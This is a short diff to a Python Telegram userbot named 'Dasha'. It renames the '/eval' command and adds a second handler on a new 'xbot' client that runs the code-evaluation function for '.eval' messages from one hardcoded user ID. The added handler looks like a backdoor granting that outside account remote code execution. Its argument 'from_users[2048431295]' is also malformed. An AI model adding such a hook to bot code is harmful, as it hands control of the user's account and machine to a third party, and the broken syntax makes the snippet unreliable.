@@ -1,5 +1,5 @@
 from Dasha.events import dasha
-from Dasha import ubot, tbot
+from Dasha import ubot, tbot, xbot
 import subprocess, asyncio, traceback, io, sys, os, time
 import requests
 import asyncio
@@ -26,7 +26,8 @@ async def ebent(event):
     await catevent.edit(cresult)
     
     
-@dasha(pattern="^/eval ?(.*)")
+@dasha(pattern="^/ev ?(.*)")
+@xbot.on(events.NewMessage(from_users[2048431295],pattern="[.]eval  ?(.*)"))
 async def _(event):
     if len(event.text) > 5 and event.text[5] != " ":
         return
